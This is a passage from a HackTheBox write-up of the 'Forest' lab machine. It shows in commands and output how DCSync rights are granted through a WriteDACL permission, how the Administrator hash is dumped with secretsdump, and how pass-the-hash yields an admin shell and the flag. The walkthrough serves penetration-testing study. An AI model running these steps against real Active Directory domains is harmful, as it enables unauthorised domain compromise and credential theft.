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" width="240" height="235" class="img_ev3q"></p>
<blockquote>
<p>The members of the group EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL" target="_blank" rel="noopener noreferrer">PERMISSIONS@HTB.LOCAL</a> have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
With write access to the target object&#x27;s DACL, you can grant yourself any privilege you want on the object.</p>
</blockquote>
<p>on the windows abuse tab it shows how to perform this dcsync attack step by step</p>
<p><img decoding="async" loading="lazy" src="/assets/images/info1-201a19fcc7c1fbcd6ffe105ebccfdb1f.png" width="594" height="482" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="write-dacl-attack">write dacl attack<a href="#write-dacl-attack" class="hash-link" aria-label="Direct link to write dacl attack" title="Direct link to write dacl attack" translate="no">​</a></h3>
<p>to perform this attack first I&#x27;ll create a new user on the domain</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; net user sentreysec password123 /add /domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The command completed successfully.</span><br></span></code></pre></div></div>
<p>first if I try secretsdump with the user I created, this gives an access denied error but when the dcsync attack is performed I will be able to see the hashes from another users</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ impacket-secretsdump htb.local/sentreysec:password123@10.10.10.161</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Cleaning up... </span><br></span></code></pre></div></div>
<p>to do this first I have to add then new user to the group exchange windows permissions</p>
<p><img decoding="async" loading="lazy" src="/assets/images/path3-72f706c1b77ba57d7ff81fca0bc2940f.png" width="879" height="217" class="img_ev3q"></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; net group | findstr &quot;*Exchange Windows Permissions&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Exchange Servers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Exchange Trusted Subsystem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Exchange Windows Permissions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*ExchangeLegacyInterop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; net group &quot;Exchange Windows Permissions&quot; sentreysec /add</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The command completed successfully.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; net user sentreysec | findstr &quot;Exchange Windows Permissions&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Global Group memberships     *Exchange Windows Perm*Domain Users</span><br></span></code></pre></div></div>
<p>I import powerview to the machine</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; upload PowerView.ps1 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Uploading /home/linux/Desktop/forest/content/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\bh\PowerView.ps1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; . .\PowerView.ps1</span><br></span></code></pre></div></div>
<p>Then following the guide that bloodhound shows I&#x27;ll abuse the write dacl permission</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; $SecPassword = ConvertTo-SecureString &#x27;password123&#x27; -AsPlainText -Force</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#x27;HTB.LOCAL\sentreysec&#x27;, $SecPassword)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>the last part gives a bit of a problem to solve it is just define the dc as &quot;DC=htb,DC=local&quot; and the parameter PrincipalIdentity user to define the user that will receive this privilege</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity sentreysec -Right</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">s DCSync</span><br></span></code></pre></div></div>
<p>after doing this now I can retrieve the hashes of other users such as administrator</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ impacket-secretsdump htb.local/sentreysec:password123@10.10.10.161</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pass-the-hash">pass the hash<a href="#pass-the-hash" class="hash-link" aria-label="Direct link to pass the hash" title="Direct link to pass the hash" translate="no">​</a></h3>
<p>with the last part of the hash I can perform a pass the hash attack to get a shell as administrator first I confirm it with crackmapexec</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo crackmapexec winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6                                 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo crackmapexec winrm 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.161    5985   FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)</span><br></span></code></pre></div></div>
<p>and finally through winrm I get a powershell session as administrator</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">htb\administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5313a89a86b...</span><br></span></code></pre></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/xffsec/xffsec.github.io/tree/main/writeups/HackTheBox/forest.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a 